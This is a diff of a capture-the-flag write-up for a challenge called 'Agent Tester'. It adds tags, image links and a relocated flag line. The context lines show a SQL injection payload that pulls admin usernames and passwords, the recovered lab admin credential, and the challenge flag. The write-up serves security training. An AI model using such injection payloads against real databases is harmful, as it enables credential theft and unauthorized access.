@@ -1,6 +1,6 @@
 # Agent Tester
 
-Tags:
+Tags: _sqlite3_ _sqli_ _SSTI_ _template_
 
 ## Challenge
 >Author: @jorgectf#3896
@@ -19,12 +19,12 @@ Tags:
 ```
 ' union select username,password from user where username="admin" --
 ```
-
-
+![sqli](sqli.png)
 
 
 Admin credential:
 
+![admin_credential](admin_credential.png)
 ```
 admin:*)(@skdnaj238374834**__**=
 ```
@@ -33,8 +33,11 @@ admin:*)(@skdnaj238374834**__**=
 
 run.sh:
 
+![run_sh](run_sh.png)
 
 app.py
+
+![app_py](app_py.png)
 ```
 /debug only available when connected as admin
 ```
@@ -131,7 +134,9 @@ Content-Length: 39
 flag{fb4a87cfa85cf8c5ab2effedb4ea7006}
 ```
 
+`flag{fb4a87cfa85cf8c5ab2effedb4ea7006}`
+
+
 ### Informations
 https://hackmd.io/@Chivato/HyWsJ31dI
 
-`flag{fb4a87cfa85cf8c5ab2effedb4ea7006}`
